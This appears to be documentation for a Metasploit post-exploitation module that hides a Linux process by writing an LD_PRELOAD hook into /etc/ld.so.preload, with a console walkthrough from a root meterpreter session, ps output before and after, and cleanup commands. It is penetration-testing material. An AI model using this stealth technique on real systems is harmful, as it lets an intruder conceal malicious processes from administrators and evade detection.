## Description

This module will hide a process with LD_PRELOAD according to command arguments or process name.


## Options

 **CMDLINE**

 The cmdline or process name to filter.

 **LIBPATH**

The shared obeject library file path. Use `/var/tmp/` as default directory.



## Verification Steps

1. get session on target
2. `use post/linux/manage/hide_process`
3. `set cmdline <cmdline>`
4. `run`

## Scenarios

### Tested on Kali Linux Rolling
```
msf5 post(linux/manage/hide_process) > options

Module options (post/linux/manage/hide_process):

   Name     Current Setting         Required  Description
   ----     ---------------         --------  -----------
   CMDLINE  evil.apk                yes       The cmdline to filter.
   LIBPATH  /var/tmp/.YzfidldoeyHd  yes       The shared obeject library file path
   SESSION  5                       yes       The session to run this module on.

msf5 post(linux/manage/hide_process) > sessions -i
sessions -i 1  sessions -i 5
msf5 post(linux/manage/hide_process) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > sysinfo
Computer     : 192.168.56.103
OS           : Kali kali-rolling (Linux 4.17.0-kali1-amd64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > bg
[*] Backgrounding session 5...
msf5 post(linux/manage/hide_process) > run

[!] SESSION may not be compatible with this module.
[*] Checking system requirement...
[+] All requirement is good.
[*] Writing c code to /tmp/TbkAYnG.c
[*] Compile c code to /var/tmp/.YzfidldoeyHd as a shared object library file
[*] Installing the process hider hook...
[+] Install the hook to hide process successful!
[+] To uninstall the hook, run command below in meterpreter.
execute -H -f sed -a "-i -e '/\/var\/tmp\/.YzfidldoeyHd/d' /etc/ld.so.preload"
rm /var/tmp/.YzfidldoeyHd
[*] Post module execution completed


```

## Before run the module
```
# root @ kali in /tmp [6:13:21] 
$ ps -ef | grep -v grep |grep evil.apk  
root      4809 10240  0 06:12 pts/2    00:00:00 vim evil.apk

```

## After 
```
# root @ kali in /tmp [6:15:30] 
$ ps -ef | grep -v grep |grep evil.apk  

```
Bingo! This process wouldn't show by `ps` command.

## Clean it
```
msf5 post(linux/manage/hide_process) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > execute -H -f sed -a "-i -e '/\/var\/tmp\/.YzfidldoeyHd/d' /etc/ld.so.preload"
Process 4907 created.
meterpreter > rm /var/tmp/.YzfidldoeyHd
meterpreter >
```
Everything backs to normal!
